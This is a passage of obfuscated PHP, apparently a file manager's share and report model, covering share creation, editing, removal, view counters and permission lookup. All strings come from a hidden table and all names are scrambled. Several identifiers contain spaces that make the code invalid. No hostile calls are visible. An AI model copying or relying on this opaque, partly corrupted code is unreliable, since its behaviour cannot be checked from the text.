Model($©Üèœ¡¾[1391])->pathInfo($ë®ĞŞŠá[$©Üèœ¡¾[194]]); } $ë®ĞŞŠá[$©Üèœ¡¾[2100]] = $¬ÍÆ¯…; return $ë®ĞŞŠá; } protected function getInfoAuth($¹İÂÅ•±) { $¼öÕ©Í =& $_SERVER[Ñ¯©ç]; $Ü™âÀÁ° = $this->getInfo($¹İÂÅ•±); if ($Ü™âÀÁ°[$¼öÕ©Í[1757]] == USER_ID) { $Ü™âÀÁ°[$¼öÕ©Í[470]] = $Ü™âÀÁ°[$¼öÕ©Í[100]][$¼öÕ©Í[470]]; } else { $Ü™âÀÁ°[$¼öÕ©Í[470]] = Model($¼öÕ©Í[551])->authMake($Ü™âÀÁ°[$¼öÕ©Í[2100]]); } return $Ü™âÀÁ°; } protected function listData($®¯“Â²ª = null, $¦úå•¾ = 300) { $†—õ„†ó =& $_SERVER[Ñ¯©ç]; $ƒ»Ÿ¶—ğ = array(array($†—õ„†ó[546] => array($†—õ„†ó[1065], 0), $†—õ„†ó[646] => array($†—õ„†ó[1065], 0), $†—õ„†ó[2101] => $†—õ„†ó[2054])); if ($®¯“Â²ª == $†—õ„†ó[2102]) { $ƒ»Ÿ¶—ğ = array($†—õ„†ó[546] => 1); } else { if ($®¯“Â²ª == $†—õ„†ó[1217]) { $ƒ»Ÿ¶—ğ = array($†—õ„†ó[646] => 1); } } $ƒ»Ÿ¶—ğ[$†—õ„†ó[1757]] = USER_ID; $Ãµ­†ï– = $this->where($ƒ»Ÿ¶—ğ)->selectPage($¦úå•¾); return $Ãµ­†ï–; } protected function listToMe($€Õª³¸„ = 300) { $«¦¤§¤ =& $_SERVER[Ñ¯©ç]; $Â˜íšéÕ = Model($«¦¤§¤[2103])->userGroupParents(USER_ID); $ÙñÎÓ“ = array($«¦¤§¤[631] => SourceModel::TYPE_USER, $«¦¤§¤[553] => USER_ID); if ($Â˜íšéÕ) { $ÙñÎÓ“ = array(array($«¦¤§¤[631] => SourceModel::TYPE_USER, $«¦¤§¤[553] => USER_ID), array($«¦¤§¤[631] => SourceModel::TYPE_GROUP, $«¦¤§¤[553] => array($«¦¤§¤[7], $Â˜íšéÕ)), $«¦¤§¤[2101] => $«¦¤§¤[2054]); } $„¾ŠäÖˆ = Model($«¦¤§¤[649])->where($ÙñÎÓ“)->selectPage($€Õª³¸„); $á°¼şÆ = array_to_keyvalue_group($„¾ŠäÖˆ[$«¦¤§¤[429]], $«¦¤§¤[648]); if (!$á°¼şÆ) { return $„¾ŠäÖˆ; } $ƒ½ıÄÔÒ = $«¦¤§¤[2104]; $ÙñÎÓ“ = array($«¦¤§¤[648] => array($«¦¤§¤[475], array_keys($á°¼şÆ)), $«¦¤§¤[1757] => array($«¦¤§¤[1067], $«¦¤§¤[229])); $şÃğ¿ÜÔ = $this->field($ƒ½ıÄÔÒ)->where($ÙñÎÓ“)->select(); foreach ($şÃğ¿ÜÔ as $É‚ÖÃ => &$ŞûÑ¤§³) { $ŞûÑ¤§³[$«¦¤§¤[2100]] = $á°¼şÆ[$ŞûÑ¤§³[$«¦¤§¤[648]]]; } unset($ŞûÑ¤§³); $°¨ç©¶Ø = array($«¦¤§¤[2105] => $şÃğ¿ÜÔ, $«¦¤§¤[2106] => $„¾ŠäÖˆ[$«¦¤§¤[426]]); return $°¨ç©¶Ø; } protected function shareAdd($¹¡éÍÔø, $µñÎş›¬) { $€…ÅÊ¥Ä =& $_SERVER[Ñ¯©ç]; $­ÎãÌ = $this->_addShareData($¹¡éÍÔø, $µñÎş›¬); if (!empty($µñÎş›¬[$€…ÅÊ¥Ä[2107]])) { $this->_shareAuthSet($­ÎãÌ, $µñÎş›¬[$€…ÅÊ¥Ä[2107]]); } $this->shareEventAdd($¹¡éÍÔø, $µñÎş›¬, $€…ÅÊ¥Ä[2108]); return $­ÎãÌ; } protected function shareAddSystem($×ÂÛ÷ıÕ, $Âó§Ò¡) { $„£ù–Ó£ =& $_SERVER[Ñ¯©ç]; $»¬ÒäùÁ = $this->_addShareData($×ÂÛ÷ıÕ, $Âó§Ò¡, $„£ù–Ó£[192]); $this->_shareAuthSet($»¬ÒäùÁ, $Âó§Ò¡[$„£ù–Ó£[2107]]); return $»¬ÒäùÁ; } private function shareEventAdd($¦Åî—ı, $ÏªÀ­í‡, $÷Ÿ©Ô¶¬ = "\141\x64\144") { $—•ÛÊ…ß =& $_SERVER[Ñ¯©ç]; if (!$¦Åî—ı || $¦Åî—ı == $—•ÛÊ…ß[229]) { return; } if ($÷Ÿ©Ô¶¬ == $—•ÛÊ…ß[2108]) { if ($ÏªÀ­í‡[$—•ÛÊ…ß[546]] == $—•ÛÊ…ß[101]) { Model($—•ÛÊ…ß[616])->eventShare($¦Åî—ı, $—•ÛÊ…ß[2109]); } if ($ÏªÀ­í‡[$—•ÛÊ…ß[646]] == $—•ÛÊ…ß[101]) { Model($—•ÛÊ…ß[616])->eventShare($¦Åî—ı, $—•ÛÊ…ß[2110]); } return; } $ñáåê˜‹ = $this->getInfoByPath($¦Åî—ı); $ğÂ¨íò = $—•ÛÊ…ß[2111]; if ($ñáåê˜‹[$—•ÛÊ…ß[546]] == $—•ÛÊ…ß[229] && $ÏªÀ­í‡[$—•ÛÊ…ß[546]] == $—•ÛÊ…ß[101]) { $ğÂ¨íò = $—•ÛÊ…ß[2109]; } if ($ñáåê˜‹[$—•ÛÊ…ß[546]] == $—•ÛÊ…ß[101] && $ÏªÀ­í‡[$—•ÛÊ…ß[546]] == $—•ÛÊ…ß[229]) { $ğÂ¨íò = $—•ÛÊ…ß[2112]; } if ($ñáåê˜‹[$—•ÛÊ…ß[646]] == $—•ÛÊ…ß[229] && $ÏªÀ­í‡[$—•ÛÊ…ß[646]] == $—•ÛÊ…ß[101]) { $ğÂ¨íò = $—•ÛÊ…ß[2110]; } if ($ñáåê˜‹[$—•ÛÊ…ß[646]] == $—•ÛÊ…ß[101] && $ÏªÀ­í‡[$—•ÛÊ…ß[646]] == $—•ÛÊ…ß[229]) { $ğÂ¨íò = $—•ÛÊ…ß[2113]; } Model($—•ÛÊ…ß[616])->eventShare($¦Åî—ı, $ğÂ¨íò); return; } private function _addShareData($Å¨ÚğôÆ, $œËè“¿Î = array(), $·µÔºö = false) { $™Ó‹û„ =& $_SERVER[Ñ¯©ç]; $áşÆ«öµ = $·µÔºö == $™Ó‹û„[192] ? 0 : USER_ID; $Ğéæ—µó = array($™Ó‹û„[474] => $Å¨ÚğôÆ, $™Ó‹û„[1748] => $áşÆ«öµ); if ($Å¨ÚğôÆ == 0) { $Ğéæ—µó = array($™Ó‹û„[2114] => $œËè“¿Î[$™Ó‹û„[1232]], $™Ó‹û„[1748] => $áşÆ«öµ); } if ($¨ûüóÊ‘ = $this->where($Ğéæ—µó)->find()) { return $¨ûüóÊ‘[$™Ó‹û„[648]]; } if ($Å¨ÚğôÆ == 0) { $¿ï•Ö· = array($™Ó‹û„[32] => get_path_this($œËè“¿Î[$™Ó‹û„[97]])); } else { $¿ï•Ö· = Model($™Ó‹û„[877])->sourceInfo($Å¨ÚğôÆ); if (!$¿ï•Ö·) { return !1; } } if (!$œËè“¿Î[$™Ó‹û„[1647]]) { $œËè“¿Î[$™Ó‹û„[1647]] = $¿ï•Ö·[$™Ó‹û„[32]]; } $ÔåÅßìŠ = array($™Ó‹û„[1748] => $áşÆ«öµ, $™Ó‹û„[474] => $Å¨ÚğôÆ, $™Ó‹û„[1647] => $™Ó‹û„[12], $™Ó‹û„[546] => 0, $™Ó‹û„[646] => 0, $™Ó‹û„[1232] => $™Ó‹û„[12], $™Ó‹û„[367] => $™Ó‹û„[12], $™Ó‹û„[942] => $™Ó‹û„[12], $™Ó‹û„[2115] => 0, $™Ó‹û„[2116] => 0, $™Ó‹û„[814] => 0, $™Ó‹û„[2117] => $™Ó‹û„[12], $™Ó‹û„[2098] => $™Ó‹û„[12]); $›†òª•„ = explode($™Ó‹û„[50], $™Ó‹û„[2118]); foreach ($›†òª•„ as $âÕÚ®Ôì) { if (!isset($œËè“¿Î[$âÕÚ®Ôì])) { continue; } $ÔåÅßìŠ[$âÕÚ®Ôì] = $œËè“¿Î[$âÕÚ®Ôì]; } $Èó»¯» = $this->add($ÔåÅßìŠ); $óêÅ•‘ä = array($™Ó‹û„[2098] => short_id($Èó»¯»)); $this->where(array($™Ó‹û„[2119] => $Èó»¯»))->save($óêÅ•‘ä); return $Èó»¯»; } private function _shareAuthSet($§ùæÍä–, $ÛÇ§‹ã³) { $Ö¬ÂİÜï =& $_SERVER[Ñ¯©ç]; if (!is_array($ÛÇ§‹ã³)) { return !1; } $Û³‚×±ä = Model($Ö¬ÂİÜï[2064]); $Û³‚×±ä->where(array($Ö¬ÂİÜï[648] => $§ùæÍä–))->delete(); $ãôòÑ†å = array(); foreach ($ÛÇ§‹ã³ as $ÖŸå‚ìŸ) { $¡ŞÔ¦˜ = SourceModel::TYPE_USER; if ($ÖŸå‚ìŸ[$Ö¬ÂİÜï[191]] == SourceModel::TYPE_GROUP) { $¡ŞÔ¦˜ = SourceModel::TYPE_GROUP; } $ØûÂÌ– = array($Ö¬ÂİÜï[648] => $§ùæÍä–, $Ö¬ÂİÜï[191] => $¡ŞÔ¦˜, $Ö¬ÂİÜï[553] => intval($ÖŸå‚ìŸ[$Ö¬ÂİÜï[553]]), $Ö¬ÂİÜï[2060] => 0, $Ö¬ÂİÜï[2120] => -1); if ($ÖŸå‚ìŸ[$Ö¬ÂİÜï[2060]]) { $ØûÂÌ–[$Ö¬ÂİÜï[2060]] = $ÖŸå‚ìŸ[$Ö¬ÂİÜï[2060]]; } else { if ($ÖŸå‚ìŸ[$Ö¬ÂİÜï[2120]]) { $ØûÂÌ–[$Ö¬ÂİÜï[2120]] = $ÖŸå‚ìŸ[$Ö¬ÂİÜï[2120]]; } } $ãôòÑ†å[] = $ØûÂÌ–; } return $Û³‚×±ä->addAll($ãôòÑ†å, array(), !0); } public function numViewAdd($š”ñ) { $à‹¼¶Õ‡ =& $_SERVER[Ñ¯©ç]; $€âÌÙ„• = array($à‹¼¶Õ‡[2119] => $š”ñ); $this->where($€âÌÙ„•)->setAdd($à‹¼¶Õ‡[2115]); } public function numDownloadAdd($×ì˜®È¼) { $ÕŞ´å‹š =& $_SERVER[Ñ¯©ç]; $Ï«êüš = array($ÕŞ´å‹š[2119] => $×ì˜®È¼); $this->where($Ï«êüš)->setAdd($ÕŞ´å‹š[2116]); } protected function shareEdit($º£ê’İ, $Èõ¹Ù„) { $¥ËïÖ²Ğ =& $_SERVER[Ñ¯©ç]; $›Óâ¬˜ù = $this->getInfo($º£ê’İ); if (!$›Óâ¬˜ù) { return !1; } $this->_checkLinkShare($Èõ¹Ù„, $›Óâ¬˜ù); $‹•ûáá˜ = array(); $ÊÌèÑõ = explode($¥ËïÖ²Ğ[50], $¥ËïÖ²Ğ[2121]); foreach ($ÊÌèÑõ as $·¦¿Œé–) { if (!array_key_exists($·¦¿Œé–, $Èõ¹Ù„)) { continue; } $‹•ûáá˜[$·¦¿Œé–] = $Èõ¹Ù„[$·¦¿Œé–]; } $this->shareEventAdd($›Óâ¬˜ù[$¥ËïÖ²Ğ[194]], $Èõ¹Ù„, $¥ËïÖ²Ğ[1925]); $this->where(array($¥ËïÖ²Ğ[2119] => $º£ê’İ))->save($‹•ûáá˜); if (isset($Èõ¹Ù„[$¥ËïÖ²Ğ[2107]])) { $this->_shareAuthSet($º£ê’İ, $Èõ¹Ù„[$¥ËïÖ²Ğ[2107]]); } return !0; } private function _checkLinkShare($¦§ìáÌÑ, $ô±Ú™’º) { $‡³½ˆµâ =& $_SERVER[Ñ¯©ç]; if ($¦§ìáÌÑ[$‡³½ˆµâ[546]] != $‡³½ˆµâ[101]) { return; } $Ø‘Í úó = $ô±Ú™’º[$‡³½ˆµâ[100]][$‡³½ˆµâ[194]]; if ($ô±Ú™’º[$‡³½ˆµâ[100]][$‡³½ˆµâ[33]] != $‡³½ˆµâ[231]) { $Ÿ½¿Üèè = $this->_folderReport($Ø‘Í úó); if (!$Ÿ½¿Üèè) { return; } show_json(LNG($‡³½ˆµâ[2122]) . $‡³½ˆµâ[2123] . $Ÿ½¿Üèè, !1); } $ô­€íç£ = Model($‡³½ˆµâ[877])->fileInfoGet($ô±Ú™’º[$‡³½ˆµâ[100]][$‡³½ˆµâ[194]]); if (!$ô­€íç£) { return; } $üù»«Î = $this->shareFileMeta($ô­€íç£[$‡³½ˆµâ[524]]); if (isset($üù»«Î[$‡³½ˆµâ[434]]) && $üù»«Î[$‡³½ˆµâ[434]] == $‡³½ˆµâ[101]) { show_json(LNG($‡³½ˆµâ[2124]), !1); } } private function _folderReport($ÌîÀˆÎƒ) { $›À¨¨‰ =& $_SERVER[Ñ¯©ç]; $ı¦ù§Ø¤ = array($›À¨¨‰[524] => array($›À¨¨‰[1065], 0), $›À¨¨‰[803] => 3); $“Ôüï‹³ = Model($›À¨¨‰[2125])->where($ı¦ù§Ø¤)->field($›À¨¨‰[524])->select(); if (!$“Ôüï‹³) { return !1; } $“Ôüï‹³ = array_to_keyvalue($“Ôüï‹³, $›À¨¨‰[12], $›À¨¨‰[524]); $ƒ¡ÑÚê™ = $›À¨¨‰[50] . $ÌîÀˆÎƒ . $›À¨¨‰[50]; $ı¦ù§Ø¤ = array($›À¨¨‰[524] => array($›À¨¨‰[7], $“Ôüï‹³), $›À¨¨‰[568] => array($›À¨¨‰[442], "\45{$ƒ¡ÑÚê™}\45"), $›À¨¨‰[488] => 0); $ôÇàá¯³ = Model($›À¨¨‰[877])->where($ı¦ù§Ø¤)->field($›À¨¨‰[2126])->find(); if (!$ôÇàá¯³) { return !1; } $¬ï©Ç± = substr($ôÇàá¯³[$›À¨¨‰[568]], strpos($ôÇàá¯³[$›À¨¨‰[568]], $ƒ¡ÑÚê™)); $ı¦ù§Ø¤ = array($›À¨¨‰[194] => array($›À¨¨‰[7], trim($¬ï©Ç±, $›À¨¨‰[50]))); $õíé«§á = Model($›À¨¨‰[877])->where($ı¦ù§Ø¤)->field($›À¨¨‰[32])->select(); $û»Ì“²› = array_to_keyvalue($õíé«§á, $›À¨¨‰[12], $›À¨¨‰[32]); $û»Ì“²›[] = $ôÇàá¯³[$›À¨¨‰[32]]; return implode($›À¨¨‰[8], $û»Ì“²›); } protected function remove($§±£»Ù§) { $»èŸó“³ =& $_SERVER[Ñ¯©ç]; if (is_array($§±£»Ù§)) { $§±£»Ù§ = array($»èŸó“³[7], $§±£»Ù§); } $ô´µôÄ† = array($»èŸó“³[648] => $§±£»Ù§); $à˜”¥âç = $this->where($ô´µôÄ†)->delete(); if ($à˜”¥âç) { Model($»èŸó“³[649])->where(array($»èŸó“³[648] => $§±£»Ù§))->delete(); } $Òı¶æÌ = is_array($§±£»Ù§) ? $§±£»Ù§[1] : array($§±£»Ù§); for ($Ïûó“÷• = 0; $Ïûó“÷• < count($Òı¶æÌ); $Ïûó“÷•++) { $Åİò½Êï = $this->getInfo($Òı¶æÌ[$Ïûó“÷•]); if ($Åİò½Êï[$»èŸó“³[646]] == $»èŸó“³[101]) { Model($»èŸó“³[616])->eventShare($Åİò½Êï[$»èŸó“³[194]], $»èŸó“³[2113]); } if ($Åİò½Êï[$»èŸó“³[546]] == $»èŸó“³[101]) { Model($»èŸó“³[616])->eventShare($Åİò½Êï[$»èŸó“³[194]], $»èŸó“³[2112]); } } return $à˜”¥âç; } protected function removeBySource($ò¢‰Ô‰½) { $ÄÒ­ˆÚÀ =& $_SERVER[Ñ¯©ç]; $Ö˜À…ö‡ = array($ÄÒ­ˆÚÀ[474] => array($ÄÒ­ˆÚÀ[475], $ò¢‰Ô‰½)); $şğÇó½„ = $this->field($ÄÒ­ˆÚÀ[648])->where($Ö˜À…ö‡)->select(); $şğÇó½„ = array_to_keyvalue($şğÇó½„, $ÄÒ­ˆÚÀ[12], $ÄÒ­ˆÚÀ[648]); if (!$şğÇó½„) { return; } $Ö˜À…ö‡ = array($ÄÒ­ˆÚÀ[2119] => array($ÄÒ­ˆÚÀ[475], $şğÇó½„)); $this->where($Ö˜À…ö‡)->delete(); Model($ÄÒ­ˆÚÀ[649])->where($Ö˜À…ö‡)->delete(); } public function listAll($ÀÀ ªÍ½) { $¡‰ùÈÄ‹ =& $_SERVER[Ñ¯©ç]; $é—éŠ«Š = array(); if ($ÀÀ ªÍ½[$¡‰ùÈÄ‹[1757]]) { $é—éŠ«Š[$¡‰ùÈÄ‹[1757]] = $ÀÀ ªÍ½[$¡‰ùÈÄ‹[1757]]; } if ($ÀÀ ªÍ½[$¡‰ùÈÄ‹[813]]) { $¨„ëé… = $ÀÀ ªÍ½[$¡‰ùÈÄ‹[814]] ? $ÀÀ ªÍ½[$¡‰ùÈÄ‹[814]] : strtotime(date($¡‰ùÈÄ‹[2127])); $é—éŠ«Š[$¡‰ùÈÄ‹[232]] = array($¡‰ùÈÄ‹[393], array($ÀÀ ªÍ½[$¡‰ùÈÄ‹[813]], $¨„ëé…)); } if ($ÀÀ ªÍ½[$¡‰ùÈÄ‹[33]]) { $é—éŠ«Š[$ÀÀ ªÍ½[$¡‰ùÈÄ‹[33]]] = 1; } else { $é—éŠ«Š[] = array($¡‰ùÈÄ‹[546] => array($¡‰ùÈÄ‹[1065], 0), $¡‰ùÈÄ‹[646] => array($¡‰ùÈÄ‹[1065], 0), $¡‰ùÈÄ‹[2101] => $¡‰ùÈÄ‹[2054]); } if ($ÀÀ ªÍ½[$¡‰ùÈÄ‹[2050]]) { $é—éŠ«Š[] = array($¡‰ùÈÄ‹[2098] => $ÀÀ ªÍ½[$¡‰ùÈÄ‹[2050]], $¡‰ùÈÄ‹[1647] => array($¡‰ùÈÄ‹[442], "\x25{$ÀÀ ªÍ½[$¡‰ùÈÄ‹[2050]]}\x25"), $¡‰ùÈÄ‹[2101] => $¡‰ùÈÄ‹[2054]); } $Ì™Ü’¹û = $this->_makeOrder()->where($é—éŠ«Š)->selectPage(20); if (empty($Ì™Ü’¹û[$¡‰ùÈÄ‹[429]])) { return array(); } $this->_listDataApply($Ì™Ü’¹û[$¡‰ùÈÄ‹[429]]); return $Ì™Ü’¹û; } public function listDataApply($²„·Æ©æ) { $this->_listDataApply($²„·Æ©æ); return $²„·Æ©æ; } private function _listDataApply(&$Ö¯·ûöÅ) { $ß¹óÒìè =& $_SERVER[Ñ¯©ç]; $§Ş†èú = array_to_keyvalue($Ö¯·ûöÅ, $ß¹óÒìè[12], $ß¹óÒìè[1757]); $’½”‚ÊÛ = Model($ß¹óÒìè[582])->userListInfo(array_unique($§Ş†èú)); $ñˆÛôù¶ = array_to_keyvalue($Ö¯·ûöÅ, $ß¹óÒìè[12], $ß¹óÒìè[194]); $ö¸¥Ï±… = Model($ß¹óÒìè[877])->sourceListInfo($ñˆÛôù¶, !0); foreach ($Ö¯·ûöÅ as $¿õ´ÆÛ¶ => &$ì‹‚ŠÁ¡) { $§ö¼ò«– = $ì‹‚ŠÁ¡[$ß¹óÒìè[1757]]; $ì‹‚ŠÁ¡[$ß¹óÒìè[2128]] = $’½”‚ÊÛ[$§ö¼ò«–] ? $’½”‚ÊÛ[$§ö¼ò«–] : !1; $Û‘‰ÔóÜ = $ì‹‚ŠÁ¡[$ß¹óÒìè[194]]; $ì‹‚ŠÁ¡[$ß¹óÒìè[100]] = $ö¸¥Ï±…[$Û‘‰ÔóÜ] ? $ö¸¥Ï±…[$Û‘‰ÔóÜ] : !1; if ($ì‹‚ŠÁ¡[$ß¹óÒìè[100]][$ß¹óÒìè[488]] == $ß¹óÒìè[101]) { unset($Ö¯·ûöÅ[$¿õ´ÆÛ¶]); } if ($ì‹‚ŠÁ¡[$ß¹óÒìè[100]] != $ß¹óÒìè[229] && !$ì‹‚ŠÁ¡[$ß¹óÒìè[100]]) { unset($Ö¯·ûöÅ[$¿õ´ÆÛ¶]); } } unset($ì‹‚ŠÁ¡); $Ö¯·ûöÅ = array_values($Ö¯·ûöÅ); } private function _makeOrder($ŠŒ¥¢© = '') { $í„Ô¬ =& $_SERVER[Ñ¯©ç]; $‰Ûì³¨ä = array($í„Ô¬[232], $í„Ô¬[814], $í„Ô¬[2115], $í„Ô¬[2116]); $øãÒ•ÙÆ = array($í„Ô¬[506] => $í„Ô¬[507], $í„Ô¬[508] => $í„Ô¬[509]); $ïÕ–ûÜ = Input::get($í„Ô¬[513], $í„Ô¬[7], $í„Ô¬[480], $‰Ûì³¨ä); $ªŒìäÄ = Input::get($í„Ô¬[514], $í„Ô¬[7], $í„Ô¬[2129], array($í„Ô¬[2047], $í„Ô¬[508])); $ªŒìäÄ = $øãÒ•ÙÆ[$ªŒìäÄ]; $ŠŒ¥¢© = $ŠŒ¥¢© . "{$ïÕ–ûÜ}\40{$ªŒìäÄ}"; return $this->order($ŠŒ¥¢©); } public function reportAdd($ı¼Ş÷ëè) { $À¯ïõ³± =& $_SERVER[Ñ¯©ç]; $ƒ²®ü‡« = array($À¯ïõ³±[648] => $ı¼Ş÷ëè[$À¯ïõ³±[648]], $À¯ïõ³±[1757] => USER_ID); if (Model($À¯ïõ³±[2125])->where($ƒ²®ü‡«)->find()) { return !1; } $äû©çìú = array($À¯ïõ³±[648] => $ı¼Ş÷ëè[$À¯ïõ³±[648]], $À¯ïõ³±[1647] => $ı¼Ş÷ëè[$À¯ïõ³±[1647]], $À¯ïõ³±[194] => $ı¼Ş÷ëè[$À¯ïõ³±[194]], $À¯ïõ³±[524] => $ı¼Ş÷ëè[$À¯ïõ³±[524]], $À¯ïõ³±[1757] => USER_ID, $À¯ïõ³±[33] => $ı¼Ş÷ëè[$À¯ïõ³±[33]], $À¯ïõ³±[509] => $ı¼Ş÷ëè[$À¯ïõ³±[509]]); return Model($À¯ïõ³±[2125])->add($äû©çìú); } public function reportList($Üî¦üá¶) { $ÈÊÂâÑ” =& $_SERVER[Ñ¯©ç]; $‰˜ ²¿ = array(); if ($Üî¦üá¶[$ÈÊÂâÑ”[813]]) { $Îãºù× = $Üî¦üá¶[$ÈÊÂâÑ”[814]] ? $Üî¦üá¶[$ÈÊÂâÑ”[814]] : strtotime(date($ÈÊÂâÑ”[2127])); $‰˜ ²¿[$ÈÊÂâÑ”[232]] = array($ÈÊÂâÑ”[393], array($Üî¦üá¶[$ÈÊÂâÑ”[813]], $Îãºù×)); } if (isset($Üî¦üá¶[$ÈÊÂâÑ”[33]]) && in_array($Üî¦üá¶[$ÈÊÂâÑ”[33]], array($ÈÊÂâÑ”[101], $ÈÊÂâÑ”[493], $ÈÊÂâÑ”[2130], $ÈÊÂâÑ”[2131], $ÈÊÂâÑ”[2132]))) { $‰˜ ²¿[$ÈÊÂâÑ”[33]] = $Üî¦üá¶[$ÈÊÂâÑ”[33]]; } if (isset($Üî¦üá¶[$ÈÊÂâÑ”[803]]) && in_array($Üî¦üá¶[$ÈÊÂâÑ”[803]], array($ÈÊÂâÑ”[229], $ÈÊÂâÑ”[101], $ÈÊÂâÑ”[493], $ÈÊÂâÑ”[2130]))) { $‰˜ ²¿[$ÈÊÂâÑ”[803]] = $Üî¦üá¶[$ÈÊÂâÑ”[803]]; } $’İ×ÄÏ“ = Input::get($ÈÊÂâÑ”[514], $ÈÊÂâÑ”[7], $ÈÊÂâÑ”[2129], array($ÈÊÂâÑ”[2047], $ÈÊÂâÑ”[508])); $ŠˆàÅ²Æ = array($ÈÊÂâÑ”[506] => $ÈÊÂâÑ”[507], $ÈÊÂâÑ”[508] => $ÈÊÂâÑ”[509]); $„ôàƒÛ› = $ÈÊÂâÑ”[2133] . $ŠˆàÅ²Æ[$’İ×ÄÏ“]; $¨ôº± = Model($ÈÊÂâÑ”[2125])->where($‰˜ ²¿)->order($„ôàƒÛ›)->selectPage(20); if (empty($¨ôº±[$ÈÊÂâÑ”[429]])) { return array(); } $©Î ‰¥Æ = array_to_keyvalue_group($¨ôº±[$ÈÊÂâÑ”[429]], $ÈÊÂâÑ”[803], $ÈÊÂâÑ”[648]); if (!empty($©Î ‰¥Æ[0])) { $Üî¦üá¶ = $©Î ‰¥Æ[0]; $‰˜ ²¿ = array($ÈÊÂâÑ”[648] => array($ÈÊÂâÑ”[7], $Üî¦üá¶)); $èƒûŞ±± = $this->where($‰˜ ²¿)->field($ÈÊÂâÑ”[648])->select(); $èƒûŞ±± = array_to_keyvalue($èƒûŞ±±, $ÈÊÂâÑ”[12], $ÈÊÂâÑ”[648]); $Ñ¾˜Ü‘à = array_diff($Üî¦üá¶, $èƒûŞ±±); if (!empty($Ñ¾˜Ü‘à)) { foreach ($¨ôº±[$ÈÊÂâÑ”[429]] as $Å•—Üˆ => $¥¡Ú¬öÓ) { if (in_array($¥¡Ú¬öÓ[$ÈÊÂâÑ”[648]], $Ñ¾˜Ü‘à)) { unset($¨ôº±[$ÈÊÂâÑ”[429]][$Å•—Üˆ]); } } } } $this->_listDataApply($¨ôº±[$ÈÊÂâÑ”[429]]); return $¨ôº±; } public function reportStatus($üÍëóŠ) { $İ±¼½î† =& $_SERVER[Ñ¯©ç]; $ó×á†¬´ = array($İ±¼½î†[458] => $üÍëóŠ[$İ±¼½î†[458]]); $ÔŠ…„ = Model($İ±¼½î†[2125])->where($ó×á†¬´)->field($İ±¼½î†[2134])->find(); if (!$ÔŠ…„) { return !1; } $¢»Ú¥ ğ = array($İ±¼½î†[803] => $üÍëóŠ[$İ±¼½î†[803]]); if ($üÍëóŠ[$İ±¼½î†[803]] == $İ±¼½î†[2130] && $ÔŠ…„[$İ±¼½î†[803]] == $İ±¼½î†[2130]) { $¢»Ú¥ ğ[$İ±¼½î†[803]] = 0; } $ë¶şŒ¾ü = Model($İ±¼½î†[2125])->where($ó×á†¬´)->save($¢»Ú¥ ğ); if ($üÍëóŠ[$İ±¼½î†[803]] == $İ±¼½î†[493]) { if ($ÔŠ…„[$İ±¼½î†[524]] != $İ±¼½î†[229] && $this->shareFileMeta($ÔŠ…„[$İ±¼½î†[524]])) { $this->shareFileMeta($ÔŠ…„[$İ±¼½î†[524]], 0); } $this->remove($ÔŠ…„[$İ±¼½î†[648]]); return !0; } if ($ë¶şŒ¾ü && $üÍëóŠ[$İ±¼½î†[803]] == $İ±¼½î†[2130]) { $ßíÛ’Ûå = $¢»Ú¥ ğ[$İ±¼½î†[803]] == $İ±¼½î†[2130] ? 1 : 0; $this->shareFileMeta($ÔŠ…„[$İ±¼½î†[524]], $ßíÛ’Ûå); $this->removeByFile($ÔŠ…„[$İ±¼½î†[524]]); } return $ë¶şŒ¾ü; } private function removeByFile($·öÇ®Àª) { $‚ËÚ‡­‡ =& $_SERVER[Ñ¯©ç]; $³şÇ¡ù = Model($‚ËÚ‡­‡[877])->where(array($‚ËÚ‡­‡[524] => $·öÇ®Àª))->field($‚ËÚ‡­‡[194])->select(); $¡ò¡çò› = array_to_keyvalue($³şÇ¡ù, $‚ËÚ‡­‡[12], $‚ËÚ‡­‡[194]); $¢Ü¾Úäí = array($‚ËÚ‡­‡[194] => array($‚ËÚ‡­‡[7], $¡ò¡çò›), $‚ËÚ‡­‡[546] => 1); $³şÇ¡ù = $this->where($¢Ü¾Úäí)->field($‚ËÚ‡­‡[648])->select(); if (empty($³şÇ¡ù)) { return; } $À”±®ãá = array_to_keyvalue($³şÇ¡ù, $‚ËÚ‡­‡[12], $‚ËÚ‡­‡[648]); $this->remove($À”±®ãá); } private function shareFileMeta($Ş¤à¼²Ï, $ü¢Ô¥ = null) { $¯™®¦ı =& $_SERVER[Ñ¯©ç]; $ÒİïÃªõ = array($¯™®¦ı[524] => $Ş¤à¼²Ï, $¯™®¦ı[107] => $¯™®¦ı[2135]); if (is_null($ü¢Ô¥)) { return Model($¯™®¦ı[2136])->where($ÒİïÃªõ)->find(); } $ÒİïÃªõ[$¯™®¦ı[434]] = $ü¢Ô¥; Model($¯™®¦ı[2136])->add($ÒİïÃªõ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\x72\x63\x65\137\x61\165\x74\150"; public function getAuth($°™¶«àé) { $æ­¼±š =& $_SERVER[Ñ¯©ç]; $ŞİµÁ—¦ = $this->sourceAuthSelect($°™¶«àé); $ÊİĞ¿ÊÂ = array(); $´ªö–Ã­ = array(); $½çò°ô® = 2 << 25; foreach ($ŞİµÁ—¦ as $ßößÅõ’) { $¿íÌòàÁ = Model($æ­¼±š[555])->listData($ßößÅõ’[$æ­¼±š[2060]]); if (!$¿íÌòàÁ) { continue; } $ÊİĞ¿ÊÂ[] = $ßößÅõ’; $ªŒäˆèÚ = 0; if ($ßößÅõ’[$æ­¼±š[191]] == SourceModel::TYPE_GROUP) { $ªŒäˆèÚ = $½çò°ô® * 2; } if ($ßößÅõ’[$æ­¼±š[191]] == SourceModel::TYPE_USER) { $ªŒäˆèÚ = $½çò°ô®; } if ($ßößÅõ’[$æ­¼±š[191]] == SourceModel::TYPE_USER && $ßößÅõ’[$æ­¼±š[553]] == $æ­¼±š[229]) { $ªŒäˆèÚ = 0; } $´ªö–Ã­[] = $¿íÌòàÁ[$æ­¼±š[470]] + $ªŒäˆèÚ; } array_multisort($´ªö–Ã­, SORT_DESC, $ÊİĞ¿ÊÂ); return $ÊİĞ¿ÊÂ; } public function sourceAuthSelect($Ûƒå ã¸) { $ŠÆü‚˜à =& $_SERVER[Ñ¯©ç]; static $æÛ»œª¸ = array(); $Âüˆ …µ = is_array($Ûƒå ã¸) ? !1 : !0; if ($Âüˆ …µ) { $Ûƒå ã¸ = array($Ûƒå ã¸); } $ø£„¾çë = array(); foreach ($Ûƒå ã¸ as $Ç¾ÅÁ¨™) { if (isset($æÛ»œª¸[$Ç¾ÅÁ¨™])) { $ø£„¾çë[$Ç¾ÅÁ¨™] = $æÛ»œª¸[$Ç¾ÅÁ¨™]; } } if 